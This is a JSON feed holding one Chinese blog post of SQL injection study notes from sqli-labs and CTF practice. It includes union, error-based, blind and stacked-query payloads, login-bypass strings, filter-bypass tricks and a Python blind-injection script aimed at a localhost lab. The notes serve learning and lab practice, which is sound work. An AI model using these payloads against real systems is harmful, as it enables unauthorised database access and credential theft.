{
    "version": "https://jsonfeed.org/version/1",
    "title": "StarofEden🌸 • All posts by \"web安全\" tag",
    "description": "",
    "home_page_url": "https://StarofEden.github.io",
    "items": [
        {
            "id": "https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/",
            "url": "https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/",
            "title": "sql注入",
            "date_published": "2023-03-24T16:00:00.000Z",
            "content_html": "<h1 id=\"从0开始的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#从0开始的sql注入\">#</a> <strong>从 0 开始的 sql 注入</strong></h1>\n<h2 id=\"burpsuite-fuzz\"><a class=\"markdownIt-Anchor\" href=\"#burpsuite-fuzz\">#</a> burpsuite fuzz</h2>\n<ul>\n<li>Fuzz testing 是生成大量数据并且对系统产生大量异常请求，通过大量恶意请求查找漏洞。在这个过程中我们可以依赖于部分工具来实现参数化，本文以 burpsuite 为工具以文件上传为例，可用此爆破过滤的关键字</li>\n<li>遇到的问题：<br>\n在爆破时遇到报错：Too Many Reqests!<br>\n 将线程数改为 1，时间间隔改小一点</li>\n</ul>\n<h2 id=\"查询所有数据\"><a class=\"markdownIt-Anchor\" href=\"#查询所有数据\">#</a> 查询所有数据：</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 or 1=1</span><br></pre></td></tr></table></figure>\n<h2 id=\"常用语句\"><a class=\"markdownIt-Anchor\" href=\"#常用语句\">#</a> 常用语句</h2>\n<ul>\n<li>常用函数：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">database()\t//查询数据库</span><br><span class=\"line\">user()\t\t//当前数据库用户名</span><br><span class=\"line\">version()\t//MySQL 版本</span><br></pre></td></tr></table></figure>\n<ul>\n<li>爆表</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>\n<ul>\n<li>爆字段名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>\n<ul>\n<li>相应字段内容</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"1sql基本语法\"><a class=\"markdownIt-Anchor\" href=\"#1sql基本语法\">#</a> 1.sql 基本语法</h2>\n<h3 id=\"11-sql-select\"><a class=\"markdownIt-Anchor\" href=\"#11-sql-select\">#</a> 1.1 sql select</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> column1,column2 <span class=\"keyword\">from</span> table_name;     <span class=\"operator\">/</span><span class=\"operator\">/</span>从表中选取列</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> table_name;       <span class=\"operator\">/</span><span class=\"operator\">/</span>从表中选取所有列</span><br></pre></td></tr></table></figure>\n<p><em>column：(列) 字段名</em></p>\n<h3 id=\"12-where子句\"><a class=\"markdownIt-Anchor\" href=\"#12-where子句\">#</a> 1.2 where 子句</h3>\n<ul>\n<li>WHERE 子句用于提取那些满足指定条件的记录。</li>\n</ul>\n<hr>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> websites <span class=\"keyword\">where</span> coutry <span class=\"operator\">=</span> <span class=\"string\">&#x27;CN&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><em>字符要用单引号括起来，数字不用</em></p>\n<h3 id=\"13-and-or运算符\"><a class=\"markdownIt-Anchor\" href=\"#13-and-or运算符\">#</a> 1.3 AND &amp; OR 运算符</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>and</td>\n<td>显示两个条件都成立的记录</td>\n</tr>\n<tr>\n<td>or</td>\n<td>两个条件只要有一个成立，就显示其记录</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"14-order-by\"><a class=\"markdownIt-Anchor\" href=\"#14-order-by\">#</a> 1.4 order by</h3>\n<ul>\n<li>ORDER BY 关键字用于对结果集进行排序。</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> column1, column2 <span class=\"keyword\">FROM</span> table_name <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> column1, column2, ... <span class=\"keyword\">ASC</span><span class=\"operator\">|</span><span class=\"keyword\">DESC</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>column1,column2</strong>: 要排序的字段名<br>\n<strong> ASC</strong>：表示按升序排序。<br>\n<strong>DESC</strong>：表示按降序排序。<br>\n<em>默认为升序</em></p>\n<h2 id=\"2-mysql知识点\"><a class=\"markdownIt-Anchor\" href=\"#2-mysql知识点\">#</a> 2. mysql 知识点</h2>\n<table>\n<thead>\n<tr></tr>\n</thead>\n<tbody>\n<tr>\n<td>union select</td>\n<td>联合查询，判断哪些地方可被替代，并在网页上显示出来</td>\n</tr>\n<tr>\n<td>database()</td>\n<td>回显当前数据库</td>\n</tr>\n<tr>\n<td>version()</td>\n<td>查看当前竖起来版本</td>\n</tr>\n<tr>\n<td>group_concat()</td>\n<td>把产生的同一分组中的值用，连接，形成一个字符串</td>\n</tr>\n<tr>\n<td>information_schema</td>\n<td>存了很多 mysql 信息的数据库</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"联合查询\"><a class=\"markdownIt-Anchor\" href=\"#联合查询\">#</a> 联合查询：</h3>\n<p>当联合查询的数据不存在时就会创造一个虚拟数据，如：</p>\n<p><img src=\"C:%5CUsers%5Cdell%5CDesktop%5C%E7%AC%94%E8%AE%B0%5C7e5d981f76a54e22b2ce3b6a13287b46.png\" alt=\"7e5d981f76a54e22b2ce3b6a13287b46\"><br>\n 若后端查询语句是先通过查询用户名再进行密码的判断，就可以生成一个虚拟的密码，然后就可以通过查询的虚拟数据生成的密码来登录</p>\n<ul>\n<li>通常密码被 md5 加密，可传入 md5 加密后的密码</li>\n</ul>\n<h2 id=\"23可以代替\"><a class=\"markdownIt-Anchor\" href=\"#23可以代替\">#</a> <strong>%23 可以代替#</strong></h2>\n<p><strong>information_schema.schemata</strong>        information_schema 库的一个表，名为 schemata, 存储数据库名的</p>\n<ul>\n<li><strong>schema_name</strong>:schemata 表中存储 mysql 所有数据库名字的字段</li>\n</ul>\n<hr>\n<p><strong>information_schema.tables</strong> 存了 mysql 所有的表名</p>\n<ul>\n<li>TABLE_SCHEMA 表示表所属的数据库名称；</li>\n<li>TABLE_NAME 表示所属的表的名称</li>\n</ul>\n<hr>\n<p><strong>information_schema.columns</strong>  表存了所有的列的信息</p>\n<ul>\n<li>COLUMN_NAME 表示字段名，当你知道一个表的名字时，可通过此字段获得表中的所有字段名 (列名)</li>\n</ul>\n<hr>\n<ul>\n<li>关于 and 1=2  <strong>用来判断是数字型注入还是字符型注入</strong><br>\n <code>若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入。</code> <br>\n <code>若id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是数字型注入。</code></li>\n</ul>\n<h2 id=\"3搜索型注入\"><a class=\"markdownIt-Anchor\" href=\"#3搜索型注入\">#</a> 3. 搜索型注入</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select from 表名 where username like &#x27; %k% &#x27;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>构造闭合：%’</li>\n</ul>\n<h2 id=\"4insert注入\"><a class=\"markdownIt-Anchor\" href=\"#4insert注入\">#</a> 4.insert 注入</h2>\n<ul>\n<li>语句：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;必填字段&#x27;,&#x27;必填字段&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,&#x27;xx&#x27;,)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>playload:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bob&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"5盲注\"><a class=\"markdownIt-Anchor\" href=\"#5盲注\">#</a> 5. 盲注</h2>\n<h3 id=\"31报错注入\"><a class=\"markdownIt-Anchor\" href=\"#31报错注入\">#</a> 3.1 报错注入</h3>\n<ul>\n<li>delete/update/insert</li>\n<li>使用条件：页面有数据库的报错信息</li>\n<li>判断是否报错</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; -- a</span><br></pre></td></tr></table></figure>\n<h4 id=\"相关知识\"><a class=\"markdownIt-Anchor\" href=\"#相关知识\">#</a> 相关知识：</h4>\n<ul>\n<li><strong>updatexml</strong><br>\nupdatexml(xml_doument,XPath_string,new_value)<br>\n 第一个参数：XML 的内容<br>\n第二个参数：是需要 update 的位置 XPATH 路径<br>\n第三个参数：是更新后的内容<br>\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式</li>\n<li>0x7e 为符号’~'，因为不符合 xpath 语法，因此会报错，并把校验失败的东西爆出来。</li>\n</ul>\n<hr>\n<ul>\n<li>一些名词<br>\n <code>column_name:列的名称</code> <br>\n <code>Information_schema.columns:表示所有的列的信息</code> <br>\n <code>Information_schema:表示所有信息，包括库、表、列</code> <br>\n <code>Information_schema.tables:表示所有的表的信息</code> <br>\n <code>table_schema:数据库的名称</code> <br>\n <code>table_name:表的名称</code></li>\n</ul>\n<hr>\n<ul>\n<li><strong>注入方式：</strong></li>\n<li>查库</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> updataxml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,database(),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>查表</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> (group_concat(table_name)) <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database()),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>查列名</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> (group_concat(column_name)) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name<span class=\"operator\">=</span><span class=\"string\">&#x27;flag&#x27;</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>查 flag 列内容</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> (group_concat(flag)) <span class=\"keyword\">from</span> sqli.flag ),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"长度限制\"><a class=\"markdownIt-Anchor\" href=\"#长度限制\">#</a> 长度限制</h4>\n<ul>\n<li>limit：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) -- a\t//limit 0,1为展示第0条数据</span><br></pre></td></tr></table></figure>\n<ul>\n<li>substr():</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)</span><br><span class=\"line\">from mysql.user), 1 , 31)),3) -- a</span><br></pre></td></tr></table></figure>\n<h3 id=\"布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#布尔盲注\">#</a> 布尔盲注</h3>\n<ul>\n<li>特征：<br>\n1. 没有报错信息<br>\n 2. 不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是 0 或者 1)<br>\n 3. 在正确的输入下，输入 and 1=1/and 1= 2 发现可以判断<br>\n 4. 步骤：</li>\n<li>用？id=1’ and 1=1–+ 和？id=1’ and 1=2–+ 验证</li>\n<li>获取长度</li>\n<li>一个一个猜测 flag 的内容：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>((<span class=\"built_in\">ascii</span>(substr((select(flag)<span class=\"keyword\">from</span>(flag)),<span class=\"number\">1</span>,<span class=\"number\">1</span>))=<span class=\"number\">102</span>),<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>if () 第一个参数为真，则返回 1，假则返回 0<br>\nsubstr (a,1,1) 表示从第一个字符开始，截取一个字符</p>\n</blockquote>\n<ul>\n<li>其他可用函数：<br>\nleft()：</li>\n</ul>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">left(database(),1)  //前8个字符</span><br></pre></td></tr></table></figure>\n<p>mid()</p>\n<ul>\n<li>\n<p>2 分法脚本：</p>\n<p>ascii () 参数是布尔值则返回 true 或 false</p>\n<p>一下示例为获取数据库名</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_dbname</span>():</span><br><span class=\"line\">    db_name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 这个遍历是数据库名字的长度如果不够的话就一点一点猜测</span></span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (low &lt; high):</span><br><span class=\"line\">            <span class=\"comment\"># 32~127是ascii值对应的字符</span></span><br><span class=\"line\">            payload = <span class=\"string\">&quot;and ascii(substr(database(),%d,1))&gt;%d --+&quot;</span> % (i, mid)</span><br><span class=\"line\">            url1 = url + payload        <span class=\"comment\"># 获取url（原url+sql语句构造的url）</span></span><br><span class=\"line\">            res = requests.get(url1)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mid == <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">127</span>):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        db_name += <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;数据库名称为:&quot;</span> + db_name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">get_dbname()</span><br></pre></td></tr></table></figure>\n<h4 id=\"没过滤和单引号\"><a class=\"markdownIt-Anchor\" href=\"#没过滤和单引号\">#</a> 没过滤 | 和单引号’</h4>\n<ul>\n<li>playload：用户名是字符串，要用’' 包起来</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post:</span><br><span class=\"line\">payload=&quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(i,mid)</span><br></pre></td></tr></table></figure>\n<h3 id=\"时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#时间盲注\">#</a> 时间盲注</h3>\n<ul>\n<li>判断时间盲注：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and sleep(3) --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"6数据不在数据库中\"><a class=\"markdownIt-Anchor\" href=\"#6数据不在数据库中\">#</a> 6. 数据不在数据库中</h2>\n<ul>\n<li><code>知道字段数量为2后，可以查看数据库位置，使用union select 1,2查看未发现数据</code></li>\n<li><code>修改id=0或id=-1</code></li>\n<li>使用 if () 语句，若条件正确则有明显延迟</li>\n</ul>\n<h2 id=\"7cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#7cookie注入\">#</a> 7.cookie 注入</h2>\n<ul>\n<li>使用 burpsuite</li>\n<li><code>refer注入：直接在请求中写入**referer:**</code></li>\n<li><code>http refer: HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</code></li>\n</ul>\n<h2 id=\"8堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#8堆叠注入\">#</a> 8. 堆叠注入</h2>\n<ul>\n<li>使用情况：过滤了 select</li>\n</ul>\n<h3 id=\"基本语法\"><a class=\"markdownIt-Anchor\" href=\"#基本语法\">#</a> 基本语法：</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show columns from words;#\t\t</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;show columns from `1919810931114514`;#   // (字符串为表名操作时要加反引号)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>输入：</li>\n</ul>\n<blockquote>\n<p>1’ union select 1,2#</p>\n</blockquote>\n<ul>\n<li>发现过滤 select，堆叠注入。以下为 show 函数用法：</li>\n</ul>\n<blockquote>\n<p>show databases// 列出服务器可访问的数据库<br>\n show tables// 显示该数据库内相关表的名称<br>\n show columns from tablename；// 显示表 tablename 的字段、字段类型、键值信息、是否可以用 null、默认值及其他信息。</p>\n</blockquote>\n<ul>\n<li><strong>表名为数字时要用反引号括起来</strong></li>\n</ul>\n<h3 id=\"爆出字段名后\"><a class=\"markdownIt-Anchor\" href=\"#爆出字段名后\">#</a> 爆出字段名后</h3>\n<ul>\n<li>将：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from`1919810931114514`</span><br></pre></td></tr></table></figure>\n<p>进行 16 进制编码</p>\n<ul>\n<li>构造 playload：</li>\n</ul>\n<blockquote>\n<p>;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p>\n</blockquote>\n<hr>\n<ul>\n<li>prepare…from… 是预处理语句，会进行编码转换。</li>\n<li>execute 用来执行由 SQLPrepare 创建的 SQL 语句。</li>\n<li>SELECT 可以在一条语句里对多个变量同时赋值，而 SET 只能一次对一个变量赋值。</li>\n<li><code>将@a赋值为16进制编码后的语句，再将@a中的语句转换后给execsqp，执行execsql中的语句</code></li>\n</ul>\n<hr>\n<h3 id=\"handler语句\"><a class=\"markdownIt-Anchor\" href=\"#handler语句\">#</a> handler 语句</h3>\n<blockquote>\n<p>handler 是 mysql 的专用语句，没有包含到 SQL 标准中，但它每次只能查询 1 次记录，而 select 可以根据需要返回多条查询结果。<br>\nhander  <code>表名</code>  open;           // 打开一个表<br>\n handler <code>表名</code>  read frist;      // 查询第一个数据<br>\n handler <code>表名</code>  read next;     // 查询之后的数据直到最后一个数据返回空</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler`1919810931114514` open;handler`1919810931114514`read next;</span><br></pre></td></tr></table></figure>\n<h2 id=\"9万能密码\"><a class=\"markdownIt-Anchor\" href=\"#9万能密码\">#</a> 9. 万能密码:</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27;or&#x27;</span><span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span>admin<span class=\"string\">&#x27;or&#x27;</span><span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><code>输入账号密码</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> t_user <span class=\"keyword\">WHERE</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">AND</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>用 or 1=1 使 where 条件恒为 true</li>\n</ul>\n<h2 id=\"过滤\"><a class=\"markdownIt-Anchor\" href=\"#过滤\">#</a> 过滤</h2>\n<ul>\n<li>过滤空格，{}：$IFS</li>\n<li>过滤 flag：</li>\n<li>将关键字 replace 为空格，使用双写绕过</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat$IFS$9`ls` //`ls`可以输出查询结果的内容</span><br></pre></td></tr></table></figure>\n<h2 id=\"双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#双写绕过\">#</a> 双写绕过：</h2>\n<ul>\n<li>playload:(check.php)?username=‘oorr 1=1%23&amp;password=’<br>\n <code>%23为注释，注释掉后面的password，因此password可以随便写;注意先单引号闭合</code></li>\n</ul>\n<h2 id=\"10post注入\"><a class=\"markdownIt-Anchor\" href=\"#10post注入\">#</a> 10.post 注入</h2>\n<ul>\n<li>常产生地方：登录框（less-11）</li>\n<li>数据包提交方式为 post</li>\n<li>此处注释用 #或者–</li>\n</ul>\n<h2 id=\"信息搜集\"><a class=\"markdownIt-Anchor\" href=\"#信息搜集\">#</a> 信息搜集</h2>\n<blockquote>\n<p>如果我们输入 &quot;%&quot; 或者 &quot;%1<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mo separator=\"true\">,</mo><mo>¨</mo></mover><mtext>他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么</mtext><mi mathvariant=\"normal\">&quot;</mi></mrow><annotation encoding=\"application/x-tex\">\\&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&quot;%\\&quot;,&quot;%1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6679em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mpunct\">,</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">¨</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1944em;\"><span></span></span></span></span></span><span class=\"mord cjk_fallback\">他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么</span><span class=\"mord\">&quot;</span></span></span></span>&quot; 就因为没有经过任何处理而被替换为空。如果 %1$ + 非 arg 格式类型，程序会无法识别占位符类型，变为空</p>\n</blockquote>\n<p>做题时遇到了函数 addslashes ()，会在单引号前面加 / 无法用单引号闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=1&amp;pass=%1$&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "web安全"
            ]
        }
    ]
}